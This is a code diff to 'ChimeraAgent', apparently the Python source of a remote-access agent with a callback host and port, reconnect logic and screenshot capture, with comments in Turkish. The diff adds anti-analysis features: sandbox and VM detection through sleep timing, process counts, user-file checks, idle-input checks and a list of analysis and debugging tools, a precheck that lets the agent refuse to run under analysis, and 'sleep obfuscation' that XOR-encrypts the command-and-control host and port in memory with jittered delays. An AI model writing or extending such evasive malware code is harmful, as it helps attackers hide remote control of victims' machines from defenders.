@@ -2014,7 +2014,7 @@ class ChimeraAgent:
             if MAX_RECONNECT != -1 and attempts > MAX_RECONNECT:
                 return False
             
-            time.sleep(RECONNECT_DELAY)
+            self._sleep_obfuscated(RECONNECT_DELAY)
             
             if self.connect():
                 self.send_sysinfo()
@@ -2497,6 +2497,179 @@ class ChimeraAgent:
                 except Exception:
                     pass
             
+            # 6. Zamanlama Analizi (Sandbox'lar sleep'i hızlandırabilir)
+            try:
+                expected_delay = 0.5
+                t_start = time.time()
+                time.sleep(expected_delay)
+                t_elapsed = time.time() - t_start
+                
+                # Beklenen süreden %20'den fazla sapma varsa sandbox olabilir
+                deviation = abs(t_elapsed - expected_delay) / expected_delay
+                if deviation > 0.20:
+                    result["vm_indicators"].append(
+                        f"Timing: Sleep {expected_delay}s beklendi, {t_elapsed:.3f}s geçti "
+                        f"(sapma: %{deviation*100:.0f})"
+                    )
+                    indicators_found += 1.5
+            except Exception:
+                pass
+            
+            # 7. Process Sayısı Kontrolü (Normal sistem 50+ process)
+            try:
+                if sys.platform == "win32":
+                    output = subprocess.check_output(
+                        "tasklist /NH",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('cp1254', errors='ignore')
+                    proc_count = len([l for l in output.strip().split('\n') if l.strip()])
+                else:
+                    output = subprocess.check_output(
+                        "ps aux",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('utf-8', errors='ignore')
+                    proc_count = len(output.strip().split('\n')) - 1  # Header çıkar
+                
+                if proc_count < 30:
+                    result["vm_indicators"].append(
+                        f"Low process count: {proc_count} (normal > 50)"
+                    )
+                    indicators_found += 1
+            except Exception:
+                pass
+            
+            # 8. Dosya Sistemi Yapaylık Kontrolü (Kullanıcı izleri)
+            try:
+                user_artifacts = 0
+                if sys.platform == "win32":
+                    home = os.environ.get("USERPROFILE", "")
+                    check_paths = [
+                        os.path.join(home, "Desktop"),
+                        os.path.join(home, "Documents"),
+                        os.path.join(home, "Downloads"),
+                        os.path.join(home, "AppData", "Local", "Google"),
+                        os.path.join(home, "AppData", "Local", "Mozilla"),
+                    ]
+                else:
+                    home = os.environ.get("HOME", os.path.expanduser("~"))
+                    check_paths = [
+                        os.path.join(home, "Desktop"),
+                        os.path.join(home, "Documents"),
+                        os.path.join(home, "Downloads"),
+                        os.path.join(home, ".mozilla"),
+                        os.path.join(home, ".config", "google-chrome"),
+                    ]
+                
+                for path in check_paths:
+                    if os.path.exists(path):
+                        try:
+                            contents = os.listdir(path)
+                            if len(contents) > 0:
+                                user_artifacts += 1
+                        except Exception:
+                            pass
+                
+                if user_artifacts < 2:
+                    result["vm_indicators"].append(
+                        f"Low user artifacts: {user_artifacts}/5 (sandbox indicator)"
+                    )
+                    indicators_found += 0.5
+            except Exception:
+                pass
+            
+            # 9. Bilinen Sandbox Araç/Process Tespiti
+            try:
+                sandbox_indicators = [
+                    # Cuckoo Sandbox
+                    "agent.py", "analyzer.py", "cuckoomon",
+                    # Joe Sandbox  
+                    "joeboxcontrol", "joeboxserver",
+                    # Any.Run
+                    "anyrun", "anydeskad",
+                    # Hybrid Analysis / VxStream
+                    "vxstream", "fiddler",
+                    # Genel analiz araçları
+                    "procmon", "procexp", "wireshark", "tcpdump",
+                    "x64dbg", "x32dbg", "ollydbg", "ida",
+                    "processhacker", "autoruns",
+                    # Sandbox DLL'leri
+                    "sbiedll", "dbghelp", "api_log",
+                ]
+                
+                if sys.platform == "win32":
+                    proc_output = subprocess.check_output(
+                        "tasklist /NH",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('cp1254', errors='ignore').lower()
+                else:
+                    proc_output = subprocess.check_output(
+                        "ps aux",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('utf-8', errors='ignore').lower()
+                
+                found_tools = []
+                for tool in sandbox_indicators:
+                    if tool in proc_output:
+                        found_tools.append(tool)
+                
+                if found_tools:
+                    result["vm_indicators"].append(
+                        f"Sandbox tools detected: {', '.join(found_tools[:5])}"
+                    )
+                    indicators_found += 2
+            except Exception:
+                pass
+            
+            # 10. Kullanıcı Etkileşimi Kontrolü
+            try:
+                if sys.platform == "win32":
+                    # Windows: GetLastInputInfo ile son kullanıcı girişi
+                    import ctypes
+                    from ctypes import Structure, c_uint, sizeof, byref, windll
+                    
+                    class LASTINPUTINFO(Structure):
+                        _fields_ = [
+                            ("cbSize", c_uint),
+                            ("dwTime", c_uint),
+                        ]
+                    
+                    lii = LASTINPUTINFO()
+                    lii.cbSize = sizeof(LASTINPUTINFO)
+                    windll.user32.GetLastInputInfo(byref(lii))
+                    
+                    tick_count = windll.kernel32.GetTickCount()
+                    idle_seconds = (tick_count - lii.dwTime) / 1000.0
+                    
+                    # 10 dakikadan fazla etkileşimsizlik
+                    if idle_seconds > 600:
+                        result["vm_indicators"].append(
+                            f"No user interaction for {idle_seconds:.0f}s"
+                        )
+                        indicators_found += 0.5
+                else:
+                    # Linux: /proc/uptime vs son giriş zamanı  
+                    try:
+                        uptime_output = subprocess.check_output(
+                            "uptime",
+                            shell=True,
+                            stderr=subprocess.DEVNULL
+                        ).decode('utf-8', errors='ignore').strip()
+                        
+                        # "0 users" kontrolü
+                        if "0 users" in uptime_output or "0 user" in uptime_output:
+                            result["vm_indicators"].append(
+                                "No logged-in users detected"
+                            )
+                            indicators_found += 0.5
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            
             # Güven seviyesini belirle
             if indicators_found >= 3:
                 result["is_virtualized"] = True
@@ -2583,6 +2756,77 @@ class ChimeraAgent:
         
         output.append("\n" + "=" * 60)
         return "\n".join(output)
+    
+    def detect_environment_precheck(self) -> bool:
+        """Hızlı sandbox ön kontrol — agent başlangıcında çağrılabilir.
+        
+        Tam ortam analizi yapmadan birkaç hızlı kontrol ile sandbox
+        olasılığını değerlendirir.
+        
+        Returns:
+            bool: True ise sandbox/VM tespit edildi (çalışmayı reddedebilir).
+        """
+        score = 0
+        
+        # 1. CPU sayısı
+        try:
+            import multiprocessing
+            if multiprocessing.cpu_count() <= 1:
+                score += 2
+        except Exception:
+            pass
+        
+        # 2. Disk boyutu
+        try:
+            total_disk = shutil.disk_usage('/').total / (1024**3)
+            if total_disk < 40:
+                score += 1.5
+        except Exception:
+            pass
+        
+        # 3. Hızlı timing kontrolü
+        try:
+            t0 = time.time()
+            time.sleep(0.2)
+            elapsed = time.time() - t0
+            if abs(elapsed - 0.2) / 0.2 > 0.25:
+                score += 2
+        except Exception:
+            pass
+        
+        # 4. RAM kontrolü (çok düşük RAM sandbox göstergesi)
+        try:
+            if sys.platform == "win32":
+                import ctypes
+                kernel32 = ctypes.windll.kernel32
+                
+                class MEMORYSTATUSEX(ctypes.Structure):
+                    _fields_ = [("dwLength", ctypes.c_ulong),
+                                ("dwMemoryLoad", ctypes.c_ulong),
+                                ("ullTotalPhys", ctypes.c_ulonglong),
+                                ("ullAvailPhys", ctypes.c_ulonglong),
+                                ("ullTotalPageFile", ctypes.c_ulonglong),
+                                ("ullAvailPageFile", ctypes.c_ulonglong),
+                                ("ullTotalVirtual", ctypes.c_ulonglong),
+                                ("ullAvailVirtual", ctypes.c_ulonglong),
+                                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+                
+                meminfo = MEMORYSTATUSEX()
+                meminfo.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+                kernel32.GlobalMemoryStatusEx(ctypes.byref(meminfo))
+                ram_gb = meminfo.ullTotalPhys / (1024**3)
+            else:
+                with open('/proc/meminfo', 'r') as f:
+                    mem_line = f.readline()
+                ram_kb = int(mem_line.split()[1])
+                ram_gb = ram_kb / (1024**2)
+            
+            if ram_gb < 2:
+                score += 1.5
+        except Exception:
+            pass
+        
+        return score >= 3
 
     # --------------------------------------------------------
     # Ekran Görüntüsü (Screenshot) - RAM üzerinden capture
@@ -2791,6 +3035,103 @@ class ChimeraAgent:
                 return f"[!] Screenshot hatası (Linux): {str(e)}"
         
         return "[!] Screenshot alınamadı. Lütfen 'pip install mss' veya 'pip install Pillow' kurun."
+
+    # --------------------------------------------------------
+    # Sleep Obfuscation (Uyku Sırasında Bellek Koruma)
+    # --------------------------------------------------------
+    def _xor_memory(self, data: bytes, key: bytes) -> bytes:
+        """Veriyi XOR ile şifreler/çözer.
+        
+        Args:
+            data: Şifrelenecek/çözülecek veri.
+            key:  XOR anahtarı.
+            
+        Returns:
+            bytes: XOR uygulanmış veri.
+        """
+        key_len = len(key)
+        return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])
+
+    def _generate_sleep_key(self, length: int = 32) -> bytes:
+        """Rastgele bir şifreleme anahtarı üretir."""
+        return bytes([random.randint(0, 255) for _ in range(length)])
+    
+    def _encrypt_sensitive_attrs(self, key: bytes) -> dict:
+        """Agent'ın hassas özniteliklerini XOR ile şifreler.
+        
+        Args:
+            key: Şifreleme anahtarı.
+            
+        Returns:
+            dict: Şifrelenmiş orijinal değerlerin yedekleri.
+        """
+        backup = {}
+        
+        # LHOST
+        try:
+            host_bytes = self.host.encode('utf-8')
+            backup['host'] = host_bytes
+            self.host = self._xor_memory(host_bytes, key).hex()
+        except Exception:
+            pass
+        
+        # Port'u string olarak şifrele
+        try:
+            port_bytes = str(self.port).encode('utf-8')
+            backup['port'] = self.port
+            self.port = int.from_bytes(self._xor_memory(port_bytes[:4].ljust(4, b'\x00'), key[:4]), 'big')
+        except Exception:
+            pass
+        
+        return backup
+    
+    def _decrypt_sensitive_attrs(self, key: bytes, backup: dict):
+        """Şifrelenmiş öznitelikleri geri çözer.
+        
+        Args:
+            key:    Şifreleme anahtarı.
+            backup: _encrypt_sensitive_attrs'tan dönen yedek.
+        """
+        if 'host' in backup:
+            try:
+                self.host = backup['host'].decode('utf-8')
+            except Exception:
+                pass
+        
+        if 'port' in backup:
+            try:
+                self.port = backup['port']
+            except Exception:
+                pass
+
+    def _sleep_obfuscated(self, duration: float):
+        """Güvenli uyku: Uyku süresinde bellekteki kritik verileri şifreler.
+        
+        Normal time.sleep() yerine kullanılır. Uyku başlamadan önce
+        hassas veriler XOR ile şifrelenir, uyandığında çözülür.
+        Ayrıca jitter (rastgele sapma) eklenerek zamanlama analizi zorlaştırılır.
+        
+        Args:
+            duration: Uyku süresi (saniye).
+        """
+        # Jitter: ±%15 rastgele sapma
+        jitter = duration * random.uniform(-0.15, 0.15)
+        actual_duration = max(0.1, duration + jitter)
+        
+        # Şifreleme anahtarı üret
+        key = self._generate_sleep_key()
+        
+        # Hassas verileri şifrele
+        backup = self._encrypt_sensitive_attrs(key)
+        
+        # Uyku
+        time.sleep(actual_duration)
+        
+        # Hassas verileri çöz
+        self._decrypt_sensitive_attrs(key, backup)
+        
+        # Anahtarı bellekten sil (üzerine yaz)
+        key = b'\x00' * len(key)
 
     # --------------------------------------------------------
     # Evasion (Atlatma) Teknikleri
